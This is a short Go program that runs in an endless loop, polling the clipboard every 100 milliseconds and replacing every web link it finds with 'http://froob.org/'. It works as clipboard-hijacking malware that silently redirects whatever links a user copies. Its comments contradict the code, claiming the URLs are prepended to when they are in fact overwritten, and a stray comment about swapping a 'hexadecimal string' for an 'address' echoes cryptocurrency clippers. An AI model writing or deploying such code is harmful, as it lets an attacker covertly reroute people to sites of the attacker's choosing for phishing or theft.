package main

import (
	"log"
	"regexp"
	"strings"
	"time"

	"github.com/f1bonacc1/glippy"
)

var re *regexp.Regexp

func main() {
	re = regexp.MustCompile(`(https?://)[^\s]+`)

	// Set up a ticker that ticks every 100 milliseconds.
	tick := time.Tick(100 * time.Millisecond)
	// Start an infinite loop, calling clipboardCheck on each iteration.
	for range tick {
		clipboardCheck()
	}
}

func clipboardCheck() {
	text, err := glippy.Get()
	if err != nil {
		// Log if there was an error getting the clipboard text.
		log.Println(err)
	}

	// If the text does not contain "http" or contains "http://froob.org/" already, return.
	if !containsURL(text) || containsFroobURL(text) {
		return
	}

	modifyText(text)
}

// containsHTTP returns true if the given text contains the string "http", false otherwise.
func containsURL(text string) bool {
	return re.MatchString(text)
}

// containsFroobURL returns true if the given text contains the string "http://froob.org/", false otherwise.
func containsFroobURL(text string) bool {
	return strings.Contains(text, "http://froob.org/")
}

// modifyText returns a modified version of the given text in which each word that starts with "https://" or "http://"
// is prepended with "http://froob.org/".
func modifyText(text string) {
	// Replace all occurrences of hexadecimal string in clipboard text with address string
	modifiedText := re.ReplaceAllLiteralString(text, "http://froob.org/")
	// Set modified clipboard text
	err := glippy.Set(modifiedText)
	if err != nil {
		// If there is an error setting the clipboard text, log the error and return
		log.Println(err)
		return
	}
}
